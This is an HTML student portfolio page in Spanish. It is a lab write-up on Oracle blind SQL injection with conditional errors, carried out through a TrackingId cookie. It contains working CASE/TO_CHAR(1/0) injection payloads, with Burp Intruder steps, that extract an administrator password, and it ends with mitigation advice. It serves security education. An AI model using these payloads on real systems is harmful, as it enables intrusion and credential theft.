@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Laboratorio 12 ·Blind SQL injection with conditional errors</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Inter', sans-serif;
+}
+
+body {
+  min-height: 100vh;
+  background: linear-gradient(180deg, #fff5f9, #ffe0ec);
+  overflow-x: hidden;
+  color: #3a1c2b;
+}
+
+.blur {
+  position: absolute;
+  border-radius: 50%;
+  filter: blur(70px);
+  opacity: 0.6;
+  z-index: 0;
+  animation: float 6s ease-in-out infinite;
+}
+
+.blur.one {
+  width: 360px;
+  height: 360px;
+  background: #ff9ac1;
+  top: -120px;
+  left: -120px;
+}
+
+.blur.two {
+  width: 300px;
+  height: 300px;
+  background: #ffb3d9;
+  bottom: -100px;
+  right: -100px;
+  animation-delay: 2s;
+}
+
+.blur.three {
+  width: 240px;
+  height: 240px;
+  background: #ffc2e1;
+  top: 40%;
+  right: 20%;
+  animation-delay: 4s;
+}
+
+@keyframes float {
+  0%, 100% { transform: translateY(0px) scale(1); }
+  50% { transform: translateY(-20px) scale(1.05); }
+}
+
+.wrapper {
+  position: relative;
+  z-index: 1;
+  max-width: 1100px;
+  margin: 70px auto;
+  padding: 20px;
+}
+
+.card {
+  background: rgba(255,255,255,0.85);
+  backdrop-filter: blur(12px);
+  border-radius: 32px;
+  padding: 55px;
+  box-shadow: 0 40px 80px rgba(255,122,168,0.25), inset 0 1px 0 rgba(255,255,255,0.6);
+  transform: translateY(0);
+  transition: transform 0.5s ease, box-shadow 0.5s ease;
+}
+
+.card:hover {
+  transform: translateY(-8px);
+  box-shadow: 0 50px 100px rgba(255,122,168,0.35);
+}
+
+.header {
+  text-align: center;
+  margin-bottom: 30px;
+}
+
+.header h1 {
+  font-size: 2.8rem;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 12px;
+  flex-wrap: wrap;
+}
+
+.alias {
+  font-size: 1rem;
+  font-weight: 400;
+  color: #ff4f9a;
+}
+
+.header h2 {
+  margin-top: 12px;
+  font-size: 1.4rem;
+  color: #ff4f9a;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+}
+
+.meta {
+  margin-top: 6px;
+  font-size: 0.95rem;
+  color: #6b3a52;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  flex-wrap: wrap;
+}
+
+nav {
+  margin-top: 40px;
+}
+
+nav ul {
+  display: flex;
+  justify-content: center;
+  flex-wrap: wrap;
+  gap: 18px;
+  list-style: none;
+}
+
+nav a {
+  text-decoration: none;
+  padding: 12px 24px;
+  border-radius: 999px;
+  background: rgba(255,255,255,0.7);
+  color: #3a1c2b;
+  font-weight: 600;
+  box-shadow: 0 8px 18px rgba(255,79,154,0.15);
+  transition: all 0.3s ease;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  border: 1px solid rgba(255,255,255,0.5);
+}
+
+nav a:hover {
+  background: linear-gradient(135deg, #ff4f9a, #ff8fc4);
+  color: #fff;
+  transform: translateY(-3px) scale(1.05);
+  box-shadow: 0 16px 30px rgba(255,79,154,0.5);
+}
+
+nav ul li {
+  position: relative;
+}
+
+.submenu {
+  position: absolute;
+  top: 100%;
+  left: 0;
+  background: rgba(255,255,255,0.95);
+  backdrop-filter: blur(10px);
+  border-radius: 20px;
+  padding: 10px 0;
+  min-width: 200px;
+  box-shadow: 0 20px 40px rgba(255,79,154,0.3);
+  opacity: 0;
+  visibility: hidden;
+  transform: translateY(20px);
+  transition: all 0.3s ease;
+  z-index: 100;
+  list-style: none;
+  border: 1px solid rgba(255,255,255,0.5);
+}
+
+nav ul li:hover .submenu {
+  opacity: 1;
+  visibility: visible;
+  transform: translateY(10px);
+}
+
+.submenu a {
+  padding: 12px 24px;
+  border-radius: 999px;
+  background: rgba(255,255,255,0.7);
+  color: #3a1c2b;
+  font-weight: 600;
+  box-shadow: 0 8px 18px rgba(255,79,154,0.15);
+  transition: all 0.3s ease;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  border: 1px solid rgba(255,255,255,0.5);
+}
+
+.submenu a:hover {
+  background: linear-gradient(135deg, #ff4f9a, #ff8fc4);
+  color: #fff;
+  transform: translateY(-3px) scale(1.05);
+  box-shadow: 0 16px 30px rgba(255,79,154,0.5);
+}
+
+/* Secciones estilo portafolio */
+.brief-text, .tech-section, .student-profile, .contact-section {
+  background: rgba(255,255,255,0.7);
+  border-radius: 24px;
+  padding: 35px;
+  margin-top: 40px;
+  box-shadow: 0 15px 35px rgba(255,122,168,0.15);
+  border-left: 5px solid #ff4f9a;
+  transition: transform 0.3s ease;
+}
+
+.brief-text:hover, .tech-section:hover, .student-profile:hover, .contact-section:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 20px 45px rgba(255,79,154,0.2);
+}
+
+.brief-text h3, .tech-section h3, .student-profile h3, .contact-section h3 {
+  font-size: 1.8rem;
+  color: #ff4f9a;
+  margin-bottom: 25px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  border-bottom: 2px solid #ffe0ec;
+  padding-bottom: 12px;
+}
+
+.brief-text h4, .student-profile h4 {
+  font-size: 1.5rem;
+  color: #ff4f9a;
+  margin-bottom: 15px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.brief-text h5, .student-profile h5 {
+  font-size: 1.2rem;
+  color: #4a2a36;
+  margin: 20px 0 10px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.img-placeholder {
+  background: linear-gradient(145deg, #ffe0ec, #ffb3d9);
+  border-radius: 20px;
+  padding: 20px;
+  margin: 20px 0;
+  text-align: center;
+  border: 2px dashed #ff4f9a;
+}
+
+.img-placeholder img {
+  max-width: 600px;
+  width: 100%;
+  height: auto;
+  border-radius: 20px;
+  box-shadow: 0 10px 25px rgba(255,79,154,0.2);
+  display: block;
+  margin: 0 auto;
+}
+
+.code-container {
+  background: #2d1b21;
+  border-radius: 16px;
+  padding: 20px;
+  margin: 20px 0;
+  border-left: 6px solid #ff4f9a;
+  overflow-x: auto;
+}
+
+.code-container pre {
+  margin: 0;
+  color: #ffe0ec;
+  font-family: 'Courier New', monospace;
+  font-size: 0.9rem;
+  white-space: pre-wrap;
+  word-wrap: break-word;
+}
+
+.footer {
+  width: 100%;
+  padding: 20px 0;
+  text-align: center;
+  background: rgba(0,0,0,0.35);
+  border-radius: 20px;
+  margin-top: 60px;
+  backdrop-filter: blur(5px);
+}
+
+.footer-content {
+  color: #f3f3f3;
+  font-size: 14px;
+}
+
+.footer-content a {
+  color: white;
+  text-decoration: underline;
+  text-decoration-color: #ff8fc4;
+}
+
+.lista-personalizada {
+  list-style: none;
+  padding-left: 0;
+}
+
+.lista-personalizada li {
+  margin-bottom: 10px;
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+}
+
+@media (max-width: 900px) {
+  .card { padding: 30px 20px; }
+  .header h1 { font-size: 2rem; flex-direction: column; }
+}
+</style>
+</head>
+<body>
+
+<div class="blur one"></div>
+<div class="blur two"></div>
+<div class="blur three"></div>
+
+<div class="wrapper">
+  <div class="card">
+
+    <!-- ========== ENCABEZADO ========= -->
+    <div class="header">
+      <h1><i class="fas fa-user-secret"></i> Laura Ivon Montelongo Martínez<span class="alias">| Alias: Ivonne</span></h1>
+      <h2><i class="fas fa-shield-alt"></i> CNO V – Seguridad Informática</h2>
+      <p class="meta"><i class="fas fa-graduation-cap"></i> ITI · Universidad Politécnica de San Luis Potosí</p>
+      <p class="meta"><i class="far fa-calendar-alt"></i> Periodo: Enero – Junio 2026</p>
+    </div>
+
+    <!-- ========== NAV ========= -->
+   <nav>
+        <ul>
+          <li><a href="index.html"><i class="fas fa-home"></i> Inicio</a></li>
+          <li>
+            <a href="#"><i class="fas fa-laptop-code"></i> Actividades <i class="fas fa-chevron-down" style="font-size:0.8rem;"></i></a>
+            <ul class="submenu">
+              <li><a href="actividades.html"><i class="fas fa-file-alt"></i> Primer Parcial</a></li>
+              <li><a href="segundo-parcial.html"><i class="fas fa-file-alt"></i> Segundo Parcial</a></li>
+              <li><a href="tercer-parcial.html"><i class="fas fa-file-alt"></i> Tercer Parcial</a></li>
+            </ul>
+          </li>
+          <li>
+            <a href="#"><i class="fas fa-trophy"></i> ROAD TO HALL OF FAME <i class="fas fa-chevron-down" style="font-size:0.8rem;"></i></a>
+            <ul class="submenu">
+              <li><a href="road-to-hall-of-fame2.html#sql-injection"><i class="fas fa-database"></i> SQL Injection</a></li>
+            </ul>
+          </li>
+          <li><a href="#"><i class="fas fa-file-alt"></i> Notas</a></li>
+          <li>
+            <a href="#"><i class="fas fa-project-diagram"></i> Proyectos <i class="fas fa-chevron-down" style="font-size:0.8rem;"></i></a>
+            <ul class="submenu">
+              <li><a href="PR01.html"><i class="fas fa-file-alt"></i>PR01</a></li>
+              <li><a href="PR02_01.html"><i class="fas fa-file-alt"></i>PR02-01</a></li>
+              <li><a href="PR02_02.html"><i class="fas fa-file-alt"></i>PR02-02</a></li>
+              <li><a href="PR02_03.html"><i class="fas fa-file-alt"></i>PR02-03</a></li>
+            </ul>
+          </li>
+          <li><a href="#"><i class="fas fa-certificate"></i> Certificaciones</a></li>
+        </ul>
+      </nav>
+
+    <!-- ========== TÍTULO LABORATORIO 12 ========= -->
+    <div class="brief-text" style="margin-top: 20px;">
+      <h3><i class="fas fa-database"></i> Laboratorio 12: Blind SQL injection with conditional errors</h3>
+    </div>
+
+    <!-- ========== DETALLES ========= -->
+    <section class="brief-text">
+      <h4><i class="fas fa-flag"></i> Detalles</h4>
+      <p><b>Nivel:</b> Intermedio (Practitioner)</p>
+      <p><b>Tipo de SQLi:</b> Inyección SQL Ciega basada en Errores Condicionales (Conditional Error-based Blind SQLi)</p>
+    </section>
+
+    <!-- ========== OBJETIVO ========= -->
+    <section class="brief-text">
+      <h4><i class="fas fa-bullseye"></i> Objetivo</h4>
+      <p>Explotar una vulnerabilidad ciega en la que la aplicación no muestra diferencias en el contenido web, pero sí cambia el código de estado HTTP al ocurrir un error fatal en la base de datos. El fin es enumerar la contraseña del usuario <code>administrator</code> forzando errores matemáticos y lograr el compromiso de la cuenta.</p>
+    </section>
+
+    <!-- ========== VULNERABILIDAD ========= -->
+    <section class="brief-text">
+      <h4><i class="fas fa-bug"></i> Vulnerabilidad</h4>
+      <p>El servidor concatena la cookie <code>TrackingId</code> directamente en la consulta SQL. Aunque la aplicación no devuelve el resultado de la consulta ni cambia su mensaje de bienvenida (como en el enfoque booleano puro), sí maneja de forma deficiente las excepciones de la base de datos. Si la consulta inyectada genera un error de ejecución en el motor SQL, el servidor devuelve un mensaje de error personalizado o un código de estado HTTP 500 (Internal Server Error). Esto nos permite hacer preguntas de "sí o no" condicionando un error deliberado a una premisa verdadera.</p>
+    </section>
+
+    <!-- ========== PROCEDIMIENTO ========= -->
+    <section class="student-profile">
+      <h4><i class="fas fa-list-ol"></i> Procedimiento</h4>
+
+      <p>Como de costumbre, entramos al laboratorio mediante el navegador de Burp Suite e inspeccionamos la página, esta vez no hay ningún cambio visible en la estructura de esta, por lo cual procederemos a atrapar una solicitud y ver como se comporta el sitio editando el TrackingId de la cookie, en este caso, le agregaremos una comilla simple al final del código.</p>
+      <div class="img-placeholder">
+        <img src="labo12.1.png" alt="Paso 1 - Interceptar solicitud">
+      </div>
+
+      <p>Enviando esta solicitud, se pudieron percibir anomalías en la respuesta derivaban de errores de sintaxis SQL. Al interceptar la petición y agregar una comilla simple el servidor arrojó un error.</p>
+      <div class="img-placeholder">
+        <img src="labo12.2.png" alt="Paso 2 - Error con comilla simple">
+      </div>
+
+      <p>Después agregamos otra comilla, al agregar las dos, el error desapareció, confirmando la inyección.</p>
+      <br>
+
+      <p>Probamos diferentes sentencias para identificar el lenguaje de la BD, intentamos una consulta general:</p>
+      <div class="code-container">
+        <pre><code>TrackingId=uGePpEdWgmwfXu35'||(SELECT '')||'</code></pre>
+      </div>
+      <p>Esta consulta falló, devolviéndonos un error, esto nos dio sospechas de que estábamos ante una BD de Oracle, por lo cual intentaremos con una tabla que es propia de este lenguaje, la cual debe de existir dentro:</p>
+      <div class="code-container">
+        <pre><code>TrackingId=uGePpEdWgmwfXu35 '||(SELECT '' FROM dual)||'</code></pre>
+      </div>
+      <p>En este caso, no recibimos ningún error, confirmando que se está usando una BD Oracle, la cual requiere estrictamente que toda sentencia SELECT incluya una cláusula FROM.</p>
+
+
+      <p>Con esto en mente, podremos construir payloads más acertados. Dado que no podíamos extraer texto directamente, construimos una estructura lógica utilizando la sentencia CASE de Oracle combinada con un error matemático forzado:</p>
+      <div class="code-container">
+        <pre><code>TrackingId=uGePpEdWgmwfXu35' ||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</code></pre>
+        <pre><code>TrackingId=uGePpEdWgmwfXu35 '||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</code></pre>
+      </div>
+      <p>Donde la segunda condición resultó en un regreso correcto de la vista de la página, por lo cual, cada sentencia verdadera nos regresará un error en la página “Internal Server Error”. Usaremos este error como ventana para consultar información.</p>
+
+
+      <p>Preguntamos por un usuario administrador con la siguiente consulta:</p>
+      <div class="code-container">
+        <pre><code>TrackingId=uGePpEdWgmwfXu35'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code></pre>
+      </div>
+      <p>El servidor nos regresó un error, por lo cual confirmamos la existencia del administrador.</p>
+
+
+      <p>Ahora debemos descubrir la contraseña. Primero determinaremos su longitud con la siguiente consulta:</p>
+      <div class="code-container">
+        <pre><code>TrackingId=uGePpEdWgmwfXu35'||(SELECT CASE WHEN LENGTH(password)= §1§ THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code></pre>
+      </div>
+      <p>Enviaremos una solicitud al intruder, donde aplicaremos un sniper attack con la consulta anterior, iterando el LENGTH = 1, donde, al ser verdadera la condición, nos revelará la longitud.</p>
+      <div class="img-placeholder">
+        <img src="labo12.3.png" alt="Paso 7 - Configuración Intruder longitud">
+      </div>
+
+      <p>Editamos el payload type como numbers, y le damos un rango de 1 a 30.</p><br>
+
+
+      <p>Además, editamos la lista Grep – Match para que nos marque las respuestas donde el servidor dio error.</p>
+      <div class="img-placeholder">
+        <img src="labo12.4.png" alt="Paso 9 - Grep Match error">
+      </div>
+
+      <p>Empezamos el ataque, al concluir, los resultados nos muestran que la página dejó de dar error a partir del número 20, por lo cual llegamos a la conclusión de que la longitud de la contraseña es igual a 20.</p>
+      <div class="img-placeholder">
+        <img src="labo12.5.png" alt="Paso 10 - Longitud 20">
+      </div>
+
+      <p>Con la longitud obtenida, nuestro siguiente objetivo es conseguir la contraseña. Al estar a ciegas, debemos repetir el proceso que hicimos en el laboratorio anterior, diseñar un payload que consulte cada carácter de la contraseña y lo compare con el abecedario y los números, por lo cual preparamos la siguiente consulta:</p>
+      <div class="code-container">
+        <pre><code>TrackingId=uGePpEdWgmwfXu35 '||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code></pre>
+      </div>
+      <p>Esta vez, no usaremos Cluster Bomb, puesto que anteriormente hacer que intruder itere todas las posiciones y compare con todo nuestro diccionario causó que el proceso de fuerza bruta costara horas, por lo cual la mejor manera es iterar manualmente para acortar el proceso drásticamente.</p>
+      <p>Agregamos nuestro diccionario a la configuración del payload.</p>
+      <div class="img-placeholder">
+        <img src="labo12.5.png" alt="Paso 11 - Diccionario de caracteres">
+      </div>
+
+      <p>Iniciamos nuestro ataque, iterando manualmente la posición de la contraseña hasta tener los 20 caracteres.</p>
+      <div class="img-placeholder">
+        <img src="labo12.6.png" alt="Paso 12 - Iteración manual">
+      </div>
+
+      <p>Al finalizar todas las iteraciones manuales, descubrimos la contraseña la cual es <code>0xkkbi6793o8z2ep4map</code>, con esto ya contamos con el usuario y la contraseña, por lo cual procedemos a probarla.</p>
+      <div class="img-placeholder">
+        <img src="labo12.8.png" alt="Paso 13 - Login exitoso">
+      </div>
+
+      <p>Logrando un inicio de sesión correcto y concluyendo este laboratorio.</p>
+      <div class="img-placeholder">
+        <img src="labo12.9.png" alt="Paso 13 - Login exitoso">
+      </div>
+    </section>
+
+    <!-- ========== INFORME FINAL ========= -->
+    <section class="brief-text">
+      <h4><i class="fas fa-file-alt"></i> Informe final</h4>
+      <h5>Vulnerabilidad Identificada</h5>
+      <p>Se identificó una vulnerabilidad de inyección SQL ciega basada en errores condicionales en la cookie <code>TrackingId</code>. La aplicación no valida la entrada y al ocurrir un error de base de datos (división por cero) devuelve un código 500, permitiendo inferir información mediante preguntas verdadero/falso. Se determinó que el motor es Oracle, se confirmó la existencia del usuario <code>administrator</code>, se obtuvo la longitud de su contraseña (20 caracteres) y finalmente se extrajo la contraseña completa mediante ataques iterativos con Intruder.</p>
+
+      <h5>Payloads Utilizados</h5>
+      <ul class="lista-personalizada">
+        <li><i class="fas fa-code" style="color:#ff4f9a;"></i> Confirmación de motor: <code>'||(SELECT '' FROM dual)||'</code></li>
+        <li><i class="fas fa-code" style="color:#ff4f9a;"></i> Estructura de error condicional: <code>'||(SELECT CASE WHEN (condición) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</code></li>
+        <li><i class="fas fa-code" style="color:#ff4f9a;"></i> Para longitud: <code>'||(SELECT CASE WHEN LENGTH(password)=§n§ THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code></li>
+        <li><i class="fas fa-code" style="color:#ff4f9a;"></i> Para extraer caracteres: <code>'||(SELECT CASE WHEN SUBSTR(password,§pos§,1)='§char§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code></li>
+      </ul>
+
+      <h5>Mitigación Recomendada</h5>
+      <ul class="lista-personalizada">
+        <li><i class="fas fa-check" style="color:#ff4f9a;"></i> Utilizar consultas parametrizadas (prepared statements) para evitar la inyección SQL.</li>
+        <li><i class="fas fa-check" style="color:#ff4f9a;"></i> Implementar un manejo de errores genérico que no devuelva códigos de estado HTTP 500 ante errores de base de datos.</li>
+        <li><i class="fas fa-check" style="color:#ff4f9a;"></i> Validar y sanitizar estrictamente las cookies, aplicando whitelist de caracteres permitidos.</li>
+        <li><i class="fas fa-check" style="color:#ff4f9a;"></i> Limitar los privilegios de la cuenta de base de datos utilizada por la aplicación.</li>
+      </ul>
+    </section>
+
+    <!-- ========== EVIDENCIA DE FINALIZACIÓN ========= -->
+    <section class="brief-text">
+      <h4><i class="fas fa-certificate"></i> Evidencia</h4>
+      <p>Captura de pantalla que acredita la realización exitosa del laboratorio.</p>
+      <div class="img-placeholder">
+        <img src="Lab12Evidencia.png" alt="Evidencia laboratorio resuelto">
+      </div>
+    </section>
+
+  </div> <!-- fin card -->
+</div> <!-- fin wrapper -->
+
+<footer class="footer">
+  <div class="footer-content">
+    <p>© 2026 <strong>Laura Ivon Montelongo Martínez</strong> · 177291 · CNO V · Seguridad Informática</p>
+    <p><a href="mailto:177291@upslp.edu.mx">177291@upslp.edu.mx</a> · Laboratorio 12 · Blind SQL injection conditional errors</p>
+  </div>
+</footer>
+
+</body>
+</html>
